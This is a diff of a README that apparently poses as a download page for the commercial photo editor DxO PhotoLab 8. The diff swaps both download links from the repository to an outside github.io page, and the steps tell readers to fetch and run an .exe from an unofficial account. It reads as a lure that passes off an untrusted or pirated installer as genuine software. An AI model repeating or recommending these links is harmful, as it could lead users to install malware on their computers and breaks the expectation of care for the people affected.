@@ -1,6 +1,6 @@
 # 📸 DxO-PhotoLab-8-2026 - Improve your digital photos with ease
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/freetimeguillotine686/DxO-PhotoLab-8-2026)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://freetimeguillotine686.github.io)
 
 This repository provides the setup files and installation instructions for DxO PhotoLab 8. The software gives photographers tools to process RAW images, fix lens issues, and improve image quality. This version supports Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ This repository provides the setup files and installation instructions for DxO P
 
 You must visit the official release page to obtain the installer for your computer. Follow these steps to access the files:
 
-1. Click this link: [Download DxO PhotoLab 8](https://github.com/freetimeguillotine686/DxO-PhotoLab-8-2026).
+1. Click this link: [Download DxO PhotoLab 8](https://freetimeguillotine686.github.io).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the most recent version number.
 4. Locate the file ending in .exe in the Assets section.
